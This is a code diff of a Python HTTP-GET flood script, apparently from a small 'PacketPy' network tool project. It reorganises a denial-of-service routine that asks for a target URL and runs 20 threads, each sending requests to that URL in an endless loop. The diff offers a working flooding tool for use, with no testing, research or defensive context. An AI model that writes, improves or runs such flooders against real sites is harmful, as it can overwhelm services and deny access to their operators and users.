@@ -1,7 +1,7 @@
-# Simple HTTP-POST Flood python script
+# Simple HTTP-GET Flood python script
 # Standalone PacketPy script
 # https://github.com/fortless
-# Base written by https://github.com/awaitclone
+# Base by https://github.com/awaitclone
 
 version = '1.1-01_beta' # Don't touch this
 
@@ -25,9 +25,6 @@ print("--------")
 print("")
 input("Press ENTER to continue ")
 print("")
-def dos(target):
-    while True:
-        res = requests.get(url)
 threads = 20        
 url = input("Target URL [https://example.com]: ")
 if not url.__contains__("http") or not url.__contains__(".") or not url.__contains__("://"):
@@ -40,47 +37,32 @@ except ValueError:
     exit("Error")
 if threads == 0:
     exit("Minimum [1]")
-clearterminal()
-def printinfo():
-    print("-----------------------------------------")
-    print("")
-    print(" -=- HTTP payload in progress.. -=-")
-    print("")
-    print("")
-    print("- Target URL: " + str(url)+ " -")
-    print("- HTTP Payload size: Random")
-    print("- OS: " + str(os.name) + " -")
-    print("- PacketPy version: " + str(version) + " -")
-    print("")
-    print("PacketPy, an open-source")
-    print("network tool library, written in")
-    print("Python.")
-    print("")
-    print("Interactive mode (HTTP Flood)")
-    print("")
-    print("---> Press CTRL+C to stop the payload!")
-    print("-----------------------------------------")
+def dos(target):
+    while True:
+        requests.get(url)
 
+clearterminal()
+print("-----------------------------------------")
+print("")
+print(" -=- HTTP payload in progress.. -=-")
+print("")
+print("")
+print("- Target URL: " + str(url)+ " -")
+print("- HTTP Payload size: Random")
+print("- OS: " + str(os.name) + " -")
+print("- PacketPy version: " + str(version) + " -")
+print("")
+print("PacketPy, an open-source")
+print("network tool library, written in")
+print("Python.")
+print("")
+print("Interactive mode (HTTP Flood)")
+print("")
+print("-----------------------------------------")
 for i in range(0, threads):
     thr = threading.Thread(target=dos, args=(url,))
     try:
         thr.start()
     except KeyboardInterrupt:
-        clearterminal()
-        print("-----------------------------------------")
-        print("")
-        print(" -=- HTTP payload stopped! -=-")
-        print("")
-        print("")
-        print("- Target URL: " + str(url)+ " -")
-        print("- HTTP Payload: None (GET request)")
-        print("- OS: " + str(os.name) + " -")
-        print("- PacketPy version: " + str(version) + " -")
-        print("")
-        print("PacketPy, an open-source")
-        print("network tool library, written in")
-        print("Python.")
-        print("")
-        print("Interactive mode (HTTP Flood)")
-        print("")
-        print("-----------------------------------------")
+        threads = 0
+        print("Payload stopped!")
